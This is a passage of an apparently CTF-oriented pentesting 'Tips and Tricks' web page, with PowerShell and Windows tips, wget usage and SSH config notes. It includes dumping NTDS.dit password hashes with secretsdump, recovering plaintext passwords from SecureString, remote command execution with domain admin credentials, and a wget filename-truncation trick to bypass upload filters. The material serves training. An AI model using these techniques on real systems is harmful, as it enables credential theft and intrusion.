@@ -1,0 +1,1445 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-R21NVEB2EY');
+    </script>
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tips and Tricks &mdash; tech.bitvijays.com 2.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script src="../_static/documentation_options.js?v=51b770b3"></script>
+        <script src="../_static/doctools.js?v=888ff710"></script>
+        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+        <script src="../_static/debug.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Appendix" href="LFC-VM-P4-Appendix.html" />
+    <link rel="prev" title="Unprivileged Shell to Privileged Shell" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            tech.bitvijays.com
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Tips and Tricks</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#windows">Windows</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#get-childitem-mode-values">Get-ChildItem Mode Values</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#zip-or-unzip-using-only-windows-built-in-capabilities">Zip or unzip using ONLY Windows’ built-in capabilities?</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#alternate-data-stream">Alternate Data Stream</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process">Redirecting Standard Out and Standard Error from PowerShell Start-Process</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#ntds-dit-and-system-hive">NTDS.dit and SYSTEM hive</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#recovering-password-from-system-security-securestring">Recovering password from System.Security.SecureString</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#copy-to-or-from-a-powershell-session">Copy To or From a PowerShell Session</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#get-hash">Get-Hash</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#active-directory-enumeration-and-remote-code-execution">Active Directory Enumeration and Remote Code Execution</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#others">Others</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#wget">Wget</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#ftp-via-wget">FTP via Wget</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#wgetrc-commands">wgetrc Commands</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#tricks">Tricks</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#ssh">SSH</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#ssh-config">ssh_config</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#http">HTTP</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#first-things">First things</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#csc-austria-ctf-tips-and-tricks">CSC Austria: CTF Tips and Tricks</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#htaccess-useragent">htaccess - UserAgent</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#cgi-bin-shellshock">CGI-BIN Shellshock</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#xss-html-injection">XSS/ HTML Injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#curl">curl</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#http-referer">HTTP Referer</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#data-uri">Data-URI</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#login-pages">Login-Pages</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#password-protected-file">Password Protected File</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#zip-file">ZIP File</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#rar2john">rar2john</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#keepass2john">keepass2john</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#encrypted-files">Encrypted Files</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#symmetric-key">Symmetric Key</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#rsa-public-private-key-encryption">RSA Public-Private Key encryption</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#rsa-given-q-p-and-e">RSA given q, p and e?</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#seccure-elliptic-curve-crypto-utility-for-reliable-encryption">SECCURE Elliptic Curve Crypto Utility for Reliable Encryption</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#gpg">GPG</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#network-information">Network Information</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#ip">ip</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#hostname">hostname</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#ss">ss</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#user-home-directory">User Home Directory</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#firefox-thunderbird-seabird">Firefox/ Thunderbird/ Seabird</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#sudoers-file">Sudoers file</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#secure-path">secure_path</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#env-reset">env_reset</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#mail-badpass">mail_badpass</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#run-parts">run-parts</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#java-keystore-file">Java keystore file</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#cracking-md5-hashes">Cracking MD5 Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#steghide">Steghide</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#git-client-privilege-escalation">Git client Privilege Escalation</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#git-ssh">GIT_SSH</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#git-template-dir">GIT_TEMPLATE_DIR</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#grep-in-input-box">Grep in input box?</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#id9">Others</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#wordpot">Wordpot</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#fakesmtp">FakeSMTP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#rubberglue">Rubberglue</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#knockd">Knockd</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#dcept">DCEPT</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P4-Appendix.html">Appendix</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">tech.bitvijays.com</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Tips and Tricks</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="tips-and-tricks">
+<h1>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Link to this heading"></a></h1>
+<section id="windows">
+<h2>Windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h2>
+<section id="get-childitem-mode-values">
+<h3>Get-ChildItem Mode Values<a class="headerlink" href="#get-childitem-mode-values" title="Link to this heading"></a></h3>
+<p>‘Mode’ values returned by PowerShell’s Get-ChildItem cmdlet?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span><span class="o">&gt;</span> <span class="n">gci</span><span class="o">|</span><span class="n">select</span> <span class="n">mode</span><span class="p">,</span><span class="n">attributes</span> <span class="o">-</span><span class="n">u</span>
+
+<span class="n">Mode</span>                <span class="n">Attributes</span>
+<span class="o">----</span>                <span class="o">----------</span>
+<span class="n">d</span><span class="o">-----</span>               <span class="n">Directory</span>
+<span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>     <span class="n">ReadOnly</span><span class="p">,</span> <span class="n">Directory</span>
+<span class="n">d</span><span class="o">----</span><span class="n">l</span> <span class="n">Directory</span><span class="p">,</span> <span class="n">ReparsePoint</span>
+<span class="o">-</span><span class="n">a</span><span class="o">----</span>                 <span class="n">Archive</span>
+</pre></div>
+</div>
+<p>In any case, the full list is:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">d</span> <span class="o">-</span> <span class="n">Directory</span>
+<span class="n">a</span> <span class="o">-</span> <span class="n">Archive</span>
+<span class="n">r</span> <span class="o">-</span> <span class="n">Read</span><span class="o">-</span><span class="n">only</span>
+<span class="n">h</span> <span class="o">-</span> <span class="n">Hidden</span>
+<span class="n">s</span> <span class="o">-</span> <span class="n">System</span>
+<span class="n">l</span> <span class="o">-</span> <span class="n">Reparse</span> <span class="n">point</span><span class="p">,</span> <span class="n">symlink</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+<section id="zip-or-unzip-using-only-windows-built-in-capabilities">
+<h3>Zip or unzip using ONLY Windows’ built-in capabilities?<a class="headerlink" href="#zip-or-unzip-using-only-windows-built-in-capabilities" title="Link to this heading"></a></h3>
+<p>Powershell way</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">A</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">FileSystem</span>
+<span class="p">[</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">]::</span><span class="n">CreateFromDirectory</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">,</span> <span class="s1">&#39;foo.zip&#39;</span><span class="p">)</span>
+<span class="p">[</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="s1">&#39;foo.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;bar&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="alternate-data-stream">
+<h3>Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Link to this heading"></a></h3>
+<p>Sometimes, <a class="reference external" href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">Alternate Data Stream</a> can be used to hide data in streams.</p>
+<p>The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).</p>
+<p>Powershell-Way</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS &gt; Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+Filename: C:\Users\Administrator\example.zip
+
+Stream             Length
+------             -------
+:$DATA             8
+pass.txt           4
+</pre></div>
+</div>
+<p>Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+The password is Passw0rd!
+</pre></div>
+</div>
+<p>Check a directory for ADS?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;
+</pre></div>
+</div>
+<p>DIR Way</p>
+<p>Current directory ADS Streams</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span> <span class="o">/</span><span class="n">r</span> <span class="o">|</span> <span class="n">find</span> <span class="s2">&quot;:$DATA&quot;</span>
+</pre></div>
+</div>
+<p>Sub-directories too</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span>   <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">r</span> <span class="o">|</span> <span class="n">find</span> <span class="s2">&quot;:$DATA&quot;</span>
+</pre></div>
+</div>
+<p>Reading the hidden stream</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>more &lt; testfile.txt:hidden_stream::$DATA
+</pre></div>
+</div>
+<p>We may also utilze <a class="reference external" href="https://github.com/codejanus/ToolSuite/blob/master/lads.exe">List Alternate Data Streams</a> LADS tool to figure out Alternate Data Streams.</p>
+</section>
+<section id="redirecting-standard-out-and-standard-error-from-powershell-start-process">
+<h3>Redirecting Standard Out and Standard Error from PowerShell Start-Process<a class="headerlink" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process" title="Link to this heading"></a></h3>
+<p>Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">Start</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">FilePath</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">foo</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">NoNewWindow</span> <span class="o">-</span><span class="n">PassThru</span> <span class="o">-</span><span class="n">Wait</span> <span class="o">-</span><span class="n">RedirectStandardOutput</span> <span class="n">stdout</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">RedirectStandardError</span> <span class="n">stderr</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process">Powershell Start-Process Module Documentation</a>.</p>
+</section>
+<section id="ntds-dit-and-system-hive">
+<h3>NTDS.dit and SYSTEM hive<a class="headerlink" href="#ntds-dit-and-system-hive" title="Link to this heading"></a></h3>
+<p>If you have found files such as</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">IP_psexec</span><span class="o">.</span><span class="n">ntdsgrab</span><span class="o">.</span><span class="n">_333512</span><span class="o">.</span><span class="n">dit</span><span class="p">:</span> <span class="n">Extensible</span> <span class="n">storage</span> <span class="n">engine</span> <span class="n">DataBase</span><span class="p">,</span> <span class="n">version</span> <span class="mh">0x620</span><span class="p">,</span> <span class="n">checksum</span> <span class="mh">0x16d44752</span><span class="p">,</span> <span class="n">page</span> <span class="n">size</span> <span class="mi">8192</span><span class="p">,</span> <span class="n">DirtyShutdown</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">version</span> <span class="mf">6.1</span>
+<span class="n">IP_psexec</span><span class="o">.</span><span class="n">ntdsgrab</span><span class="o">.</span><span class="n">_089134</span><span class="o">.</span><span class="n">bin</span><span class="p">:</span> <span class="n">MS</span> <span class="n">Windows</span> <span class="n">registry</span> <span class="n">file</span><span class="p">,</span> <span class="n">NT</span><span class="o">/</span><span class="mi">2000</span> <span class="ow">or</span> <span class="n">above</span>
+</pre></div>
+</div>
+<p>Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">ntds</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds_cracking</span><span class="o">/</span><span class="n">ntds</span><span class="o">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">system</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds_cracking</span><span class="o">/</span><span class="n">systemhive</span> <span class="n">LOCAL</span>
+</pre></div>
+</div>
+</section>
+<section id="recovering-password-from-system-security-securestring">
+<h3>Recovering password from System.Security.SecureString<a class="headerlink" href="#recovering-password-from-system-security-securestring" title="Link to this heading"></a></h3>
+<p>If we have windows credentials stored as System.Security.SecureString, we can use</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
+$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$UnsecurePassword = (New-Object PSCredential &quot;user&quot;,$SecurePassword).GetNetworkCredential().Password
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS&gt; $PlainPassword = Read-Host -AsSecureString  &quot;Enter password&quot;
+PS&gt; Enter password: ***
+PS&gt; $PlainPassword
+PS&gt; System.Security.SecureString
+PS&gt; $UnsecurePassword1 = (New-Object PSCredential &quot;user&quot;,$PlainPassword).GetNetworkCredential().Password
+PS&gt; $UnsecurePassword1
+PS&gt; yum
+</pre></div>
+</div>
+</section>
+<section id="copy-to-or-from-a-powershell-session">
+<h3>Copy To or From a PowerShell Session<a class="headerlink" href="#copy-to-or-from-a-powershell-session" title="Link to this heading"></a></h3>
+<p>This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from <a class="reference external" href="https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/">Copy To or From a PowerShell Session</a></p>
+<ul class="simple">
+<li><p>Copy Local files to a remote session :</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>##Initialize the session
+$TargetSession = New-PSSession -ComputerName HALOMEM03
+
+##  Copy Files from Local session to remote session
+Copy-Item -ToSession $TargetSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator.HALO\desktop\&quot; -Recurse
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>Copy some files from a remote session to the local server:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>## Create the session
+$SourceSession = New-PSSession -ComputerName HALODC01
+
+## Copy from Remote machine to Local machine
+Copy-Item -FromSession $SourceSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator\desktop\&quot; -Recurse
+</pre></div>
+</div>
+</li>
+</ul>
+</section>
+<section id="get-hash">
+<h3>Get-Hash<a class="headerlink" href="#get-hash" title="Link to this heading"></a></h3>
+<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash">Get-FileHash</a> Computes the hash value for a file by using a specified hash algorithm.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">FileHash</span> <span class="n">Hello</span><span class="o">.</span><span class="n">rst</span>
+
+<span class="n">Algorithm</span>       <span class="n">Hash</span>                                                                   <span class="n">Path</span>
+<span class="o">---------</span>       <span class="o">----</span>                                                                   <span class="o">----</span>
+<span class="n">SHA256</span>          <span class="mi">8</span><span class="n">A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC</span>       <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">Hello</span><span class="o">.</span><span class="n">rst</span>
+</pre></div>
+</div>
+</section>
+<section id="active-directory-enumeration-and-remote-code-execution">
+<h3>Active Directory Enumeration and Remote Code Execution<a class="headerlink" href="#active-directory-enumeration-and-remote-code-execution" title="Link to this heading"></a></h3>
+<p>Probably, refer  <span class="xref std std-doc">LFF-IPS-P3-Exploitation</span></p>
+<p>It contains</p>
+<ul class="simple">
+<li><p>Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.</p></li>
+<li><p>Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.</p></li>
+</ul>
+</section>
+<section id="others">
+<h3>Others<a class="headerlink" href="#others" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Invoking Net Use using Credentials to mount remote system</p></li>
+</ul>
+<blockquote>
+<div><p>The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+</section>
+<section id="wget">
+<h2>Wget<a class="headerlink" href="#wget" title="Link to this heading"></a></h2>
+<section id="ftp-via-wget">
+<h3>FTP via Wget<a class="headerlink" href="#ftp-via-wget" title="Link to this heading"></a></h3>
+<p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="o">-</span><span class="n">rq</span> <span class="n">ftp</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">user</span><span class="o">=</span><span class="n">username</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">password</span><span class="o">=</span><span class="n">password</span>
+</pre></div>
+</div>
+</section>
+<section id="wgetrc-commands">
+<h3>wgetrc Commands<a class="headerlink" href="#wgetrc-commands" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>output_document = file -- Set the output filename—the same as ‘-O file’.
+post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
+post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+-P prefix
+--directory-prefix=prefix
+  Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
+</pre></div>
+</div>
+</section>
+<section id="tricks">
+<h3>Tricks<a class="headerlink" href="#tricks" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let’s say, your current directory is /home/user/ if we do</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="n">IPAddress</span> <span class="o">-</span><span class="n">P</span> <span class="n">tmp</span>
+</pre></div>
+</div>
+<p>it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>wget accepts IP address in decimal format</p></li>
+<li><p>wget shortens the filename if it’s too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (<a href="#id3"><span class="problematic" id="id4">*</span></a>255/ somenumber).php.jpg and wget shortens it to aaaaaaa(<a href="#id5"><span class="problematic" id="id6">*</span></a>255).php</p></li>
+</ul>
+</section>
+</section>
+<section id="ssh">
+<h2>SSH<a class="headerlink" href="#ssh" title="Link to this heading"></a></h2>
+<section id="ssh-config">
+<h3>ssh_config<a class="headerlink" href="#ssh-config" title="Link to this heading"></a></h3>
+<p>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">## Tighten security after security incident</span>
+<span class="c1">## root never gets to log in remotely PermitRootLogin no</span>
